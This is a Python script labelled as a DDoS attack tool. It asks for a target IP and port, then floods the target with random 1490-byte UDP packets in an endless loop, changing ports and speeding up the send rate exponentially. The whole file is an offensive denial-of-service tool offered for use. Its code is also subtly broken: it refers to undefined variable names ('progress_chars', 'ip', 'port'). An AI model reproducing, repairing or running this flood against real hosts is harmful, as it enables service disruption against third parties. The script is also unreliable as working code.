import os
import platform
import socket
import sys
import time
from datetime import datetime

# Initialize operating system environment for ANSI color codes
if platform.system() == "Windows":
    os.system("")

# Capture utility instantiation timestamp
execution_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

# Initialize networking socket object (UDP Protocol)
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

# Highly optimized data payload generation matching MTU bounds
attack_bytes = os.urandom(1490)

# Defined terminal interface styling pallet
AMARILLO = "\033[93m"
BLANCO = "\033[97m"
CYAN = "\033[96m"
VERDE = "\033[92m"
ROJO = "\033[91m"
MAGENTA = "\033[95m"
RESET = "\033[0m"

banner = """
██████╗ ██████╗  ██████╗ ███████╗
██╔══██╗██╔══██╗██╔═══██╗██╔════╝
██║  ██║██║  ██║██║   ██║███████╗
██║  ██║██║  ██║██║   ██║╚════██║
██████╔╝██████╔╝╚██████╔╝███████║
╚═════╝ ╚═════╝  ╚═════╝ ╚══════╝ 
"""

def display_header():
    """Renders the main tool information panel."""
    print(VERDE + banner + RESET)
    print(VERDE + f"Distributed DDOS Attack - By Rhuebarbs | {execution_time}" + RESET)
    print(VERDE + "-" * 67 + RESET)
    print("Author : Rhuebarbs")
    print("Github : https://github.com/Dynjee")
    print(VERDE + "-" * 67 + RESET)

# Initial environment flush and configuration load
os.system("clear" if os.name == "posix" else "cls")
display_header()

# Collect targeted destination metrics
target_ip = input(VERDE + "IP Target / Domain : " + RESET)
try:
    target_port = int(input(VERDE + "Port               : " + RESET))
except ValueError:
    print(ROJO + "\n[-] Fatal Error: Port entry must be a numeric integer value." + RESET)
    sys.exit(1)

# Transition screen rendering
os.system("clear" if os.name == "posix" else "cls")
print(VERDE + """
    ___   __  __             __      _____ __             __           __   __
   /   | / /_/ /_____ ______/ /__   / ___// /_____ ______/ /____  ____/ /  / /
  / /| |/ __/ __/ __ `/ ___/ //_/   \__ \/ __/ __ `/ ___/ __/ _ \/ __  /  / / 
 / ___ / /_/ /_/ /_/ / /__/ ,<     ___/ / /_/ /_/ / /  / /_/  __/ /_/ /  /_/  
/_/  |_\__/\__/\__,_/\___/_/|_|   /____/\__/\__,_/_/   \__/\___/\__,_/  (_)   
""" + RESET)

# Sequenced progress bar configurations
progress_steps = [
    "[                    ]", "[#                   ]", "[##                  ]",
    "[###                 ]", "[####                ]", "[#####               ]",
    "[######              ]", "[#######             ]", "[########            ]",
    "[_________           ]", "[##########          ]", "[###########         ]",
    "[############        ]", "[#############       ]", "[##############      ]",
    "[###############     ]", "[################    ]", "[#################   ]",
    "[##################  ]", "[################### ]", "[####################]"
]

for i, progress in enumerate(progress_chars):
    percentage = int((i + 1) / len(progress_chars) * 100)
    sys.stdout.write("\r" + progress.replace("[", "[" + VERDE).replace("]", RESET + "]") + f" {percentage}%")
    sys.stdout.flush()
    time.sleep(0.5)

time.sleep(3)

sent = 0

base_rate = 0.1
exponential_factor = 2

try:
    while True:
        sock.sendto(attack_bytes, (ip, port))
        sent = sent + 1
        port = port + 1
        print("Sent %s packet to %s through port:%s" % (sent, ip, port))
        if port == 65534:
            port = 1

        base_rate *= exponential_factor

        time.sleep(1 / base_rate)

except KeyboardInterrupt:
    print("\n" + ROJO + "[*] User interrupted the attack." + RESET)
except Exception as e:
    print(f"Error: {e}")
